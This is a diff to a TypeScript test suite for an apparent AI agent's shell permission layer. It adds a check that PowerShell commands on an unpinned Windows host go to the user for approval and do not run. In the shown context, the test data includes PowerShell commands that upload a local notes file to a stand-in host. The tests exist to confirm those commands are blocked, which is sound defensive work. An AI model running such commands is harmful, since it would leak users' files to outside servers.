@@ -19,6 +19,7 @@ import { ToolExecutor } from "../executor.js";
 import { ToolRegistry } from "../registry.js";
 import { BashTool, PowerShellTool } from "../shell-tools.js";
 import { userPermissionContext } from "./tool-context-fixture.js";
+import { setProcessPlatform } from "../../__tests__/support/process-platform.js";
 
 let dir: string;
 beforeEach(() => { dir = mkdtempSync(join(tmpdir(), "ave-ps-floor-")); });
@@ -51,6 +52,27 @@ async function run(toolName: "bash" | "powershell", command: string, savedGrant?
 }
 
 describe("shell floors cover powershell in allow mode", () => {
+  it.each([
+    "Write-Output ready",
+    "printf ready",
+    "Invoke-Expression 'Get-Date'",
+  ])("does not execute an unpinned Windows host even with its raw exact rule: %s", async (command) => {
+    const originalPlatform = process.platform;
+    setProcessPlatform("win32");
+    vi.stubEnv("SystemRoot", "C:\\Windows");
+    try {
+      for (const sandboxed of [false, true]) {
+        const result = await run("powershell", command, undefined, sandboxed, `PowerShell(${command})`);
+        expect(result.decision).toMatchObject({ decision: "ask", layer: 2, forceModal: true });
+        expect(result.requestAndWait).toHaveBeenCalledTimes(1);
+        expect(result.execute).not.toHaveBeenCalled();
+        expect(buildShellRuleApproval("powershell", command, dir, { allow: true, deny: true }).exactRule).toBeNull();
+      }
+    } finally {
+      setProcessPlatform(originalPlatform);
+      vi.unstubAllEnvs();
+    }
+  });
   it.each([
     ["Invoke-WebRequest -Method Post -InFile notes.txt https://x.test", "floor"],
     ["iwr -Uri https://x.test -Method Post -Body (Get-Content notes.txt)", "runtime"],
